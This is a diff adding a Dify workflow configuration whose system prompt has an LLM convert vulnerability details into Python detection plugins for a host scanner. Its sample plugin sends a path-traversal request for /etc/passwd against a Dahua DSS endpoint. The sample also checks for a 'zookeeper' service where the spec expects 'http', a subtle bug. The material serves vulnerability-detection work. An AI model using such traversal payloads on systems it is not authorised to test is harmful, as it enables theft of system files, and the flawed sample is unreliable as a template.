@@ -1,0 +1,211 @@
+app:
+  description: 根据漏洞信息以及其他编程语言信息转换成python格式的漏洞检测插件
+  icon: 🤖
+  icon_background: '#FFEAD5'
+  mode: advanced-chat
+  name: 主机扫描漏洞插件生成
+  use_icon_as_answer_icon: false
+dependencies:
+- current_identifier: null
+  type: marketplace
+  value:
+    marketplace_plugin_unique_identifier: langgenius/deepseek:0.0.6@dd589dc093c8084925858034ab5ec1fdf0d33819f43226c2f8c4a749a9acbbb2
+kind: app
+version: 0.4.0
+workflow:
+  conversation_variables: []
+  environment_variables: []
+  features:
+    file_upload:
+      allowed_file_extensions:
+      - .JPG
+      - .JPEG
+      - .PNG
+      - .GIF
+      - .WEBP
+      - .SVG
+      allowed_file_types:
+      - image
+      allowed_file_upload_methods:
+      - local_file
+      - remote_url
+      enabled: false
+      fileUploadConfig:
+        audio_file_size_limit: 50
+        batch_count_limit: 5
+        file_size_limit: 15
+        image_file_size_limit: 10
+        video_file_size_limit: 100
+        workflow_file_upload_limit: 10
+      image:
+        enabled: false
+        number_limits: 3
+        transfer_methods:
+        - local_file
+        - remote_url
+      number_limits: 3
+    opening_statement: ''
+    retriever_resource:
+      enabled: true
+    sensitive_word_avoidance:
+      enabled: false
+    speech_to_text:
+      enabled: false
+    suggested_questions: []
+    suggested_questions_after_answer:
+      enabled: false
+    text_to_speech:
+      enabled: false
+      language: ''
+      voice: ''
+  graph:
+    edges:
+    - data:
+        sourceType: start
+        targetType: llm
+      id: 1756949133345-llm
+      source: '1756949133345'
+      sourceHandle: source
+      target: llm
+      targetHandle: target
+      type: custom
+    - data:
+        sourceType: llm
+        targetType: answer
+      id: llm-answer
+      source: llm
+      sourceHandle: source
+      target: answer
+      targetHandle: target
+      type: custom
+    nodes:
+    - data:
+        desc: ''
+        selected: false
+        title: 开始
+        type: start
+        variables: []
+      height: 54
+      id: '1756949133345'
+      position:
+        x: 80
+        y: 282
+      positionAbsolute:
+        x: 80
+        y: 282
+      sourcePosition: right
+      targetPosition: left
+      type: custom
+      width: 244
+    - data:
+        context:
+          enabled: false
+          variable_selector: []
+        desc: ''
+        memory:
+          query_prompt_template: '{{#sys.query#}}
+
+
+            {{#sys.files#}}'
+          role_prefix:
+            assistant: ''
+            user: ''
+          window:
+            enabled: false
+            size: 10
+        model:
+          completion_params:
+            temperature: 0.7
+          mode: chat
+          name: deepseek-chat
+          provider: langgenius/deepseek/deepseek
+        prompt_template:
+        - id: 2de3232f-1fe1-4c46-95d6-4deb2fed6484
+          role: system
+          text: "你是一个专业的漏洞代码转换专家，请根据用户提供的漏洞详情（中文描述或任意语言的漏洞代码）生成符合以下规范的Python检测脚本：\n\
+            \n# 代码规范要求\n1. 类命名规则：\n   - 必须以`Dv`开头后接6位随机数字（如`Dv300165`）\n   - 随机数范围：100000-999999\n\
+            \n2. 必须包含的核心方法：\n```python\ndef verify(self, ctx: dict) -> dict:\n   \
+            \ url: str = ctx['url']\n    service: str = ctx['service']#判断服务类型常见的是http\n\
+            \    result: Dict[str, Any] = {\"issue\": False}\n    if service != 'http':\
+            \ #协议不对就直接退出，提高效率,智能判断协议\n            return result\n    # 检测逻辑实现...\n\
+            \    return result\n```\n\n3. Info字典必须包含以下字段（按示例格式）：\n```python\nself.Info\
+            \ = {\n    'requires': [''],          # 依赖组件，默认空列表\n    'description':\
+            \ '',         # 漏洞详细描述（需从输入提取）\n    'name': '',                # 漏洞名称（需从输入提取）\n\
+            \    'references': [],          # 漏洞来源链接（需从输入提取）\n    'updateDate': '',\
+            \         # 当前日期（YYYY-MM-DD）\n    'createDate': '',         # 当前日期（YYYY-MM-DD）\n\
+            \    'author': ['cozi@dbapp'],       # 默认值\n    'version': '1.0',    \
+            \    # 默认值\n    'ruleID': '',             # 与类名保持一致\n    'cnvd': '', \
+            \              # 根据输入提取\n    'cve': '',                # 根据输入提取\n    'cnnvd':\
+            \ ''               # 根据输入提取\n}\n```\n\n4.最后生成测试代码：\n如：\nif __name__ ==\
+            \ '__main__':\n    print(Dv300165().verify({\"url\": \"http://127.0.0.1:8080\"\
+            ,\"service\":\"http\"}))\n\n5.请求超时默认为5秒钟\n6.requests请求增加verify=False\n\
+            \n# 处理流程\n1. 信息提取：\n   - 从输入中识别漏洞名称、描述、参考链接\n   - 提取漏洞编号（CNVD/CVE/CNNVD）\n\
+            \   - 分析漏洞验证逻辑（如：请求特征、响应特征）\n\n2. 代码生成：\n   - 自动生成符合规范的类结构\n   - 实现verify方法的核心检测逻辑\n\
+            \   - 自动填充Info字典所有字段\n   - 对URL处理要兼容末尾斜杠情况\n\n3. 输出要求：\n   - 首行添加标准库导入（如requests,\
+            \ typing）\n   - 包含完整的类型注解\n   - 关键操作添加注释说明\n   - 响应检测必须包含明确的特征判断\n\n#\
+            \ 示例输入输出\n用户输入：\n\"大华DSS系统存在任意文件下载漏洞，可通过/fileDownload?path=../../../etc/passwd下载系统文件，CNVD-2020-61986\"\
+            \n\n预期输出：\n```python\nfrom typing import Dict, Any\nimport requests\n\n\
+            class Dv842176:\n    \n    def verify(self, ctx: dict) -> dict:\n    \
+            \    url: str = ctx['url']\n        service: str = ctx['service']\n  \
+            \      result: Dict[str, Any] = {\"issue\": False}\n        if service\
+            \ != 'zookeeper':\n            return result\n        \n        # 构造漏洞路径\n\
+            \        vuln_path = '/fileDownload?path=../../../etc/passwd'\n      \
+            \  target_url = url.rstrip('/') + vuln_path\n        \n        try:\n\
+            \            response = requests.get(target_url, verify=False, timeout=5)\n\
+            \            if response.status_code == 200 and 'root:x:0:0:root' in response.text:\n\
+            \                result.update({\n                    \"issue\": True,\n\
+            \                    \"testResponse\": response.text,\n              \
+            \      \"url\": target_url\n                })\n        except Exception\
+            \ as e:\n            pass\n            \n        return result\n     \
+            \   \n    def __init__(self) -> None:\n        self.Info = {\n       \
+            \     'requires': [''],\n            'description': '大华DSS系统存在任意文件下载漏洞，可通过/fileDownload?path参数遍历下载系统文件',\n\
+            \            'name': '大华DSS系统任意文件下载漏洞',\n            'references': ['https://www.cnvd.org.cn/flaw/show/CNVD-2020-61986'],\n\
+            \            'updateDate': '2024-03-20',\n            'createDate': '2024-03-20',\n\
+            \            'author': ['cozi@dbapp'],\n            'version': '1.0',\n\
+            \            'ruleID': 'Dv842176',\n            'cnvd': 'CNVD-2020-61986',\n\
+            \            'cve': '',\n            'cnnvd': ''\n        }\nif __name__\
+            \ == '__main__':\n    print(Dv842176().verify({\"url\": \"http://127.0.0.1:8080\"\
+            ,\"service\":\"http\"}))\n```\n\n请开始处理用户输入，严格遵循上述规范生成代码。对于不确定的字段（如CVE编号）可留空，但必须保留字段结构。"
+        selected: true
+        title: LLM
+        type: llm
+        variables: []
+        vision:
+          enabled: false
+      height: 90
+      id: llm
+      position:
+        x: 380
+        y: 282
+      positionAbsolute:
+        x: 380
+        y: 282
+      selected: true
+      sourcePosition: right
+      targetPosition: left
+      type: custom
+      width: 244
+    - data:
+        answer: '{{#llm.text#}}'
+        desc: ''
+        selected: false
+        title: 直接回复
+        type: answer
+        variables: []
+      height: 105
+      id: answer
+      position:
+        x: 680
+        y: 282
+      positionAbsolute:
+        x: 680
+        y: 282
+      selected: false
+      sourcePosition: right
+      targetPosition: left
+      type: custom
+      width: 244
+    viewport:
+      x: 88.50942036520428
+      y: 125.84516352974134
+      zoom: 0.8408964152537131
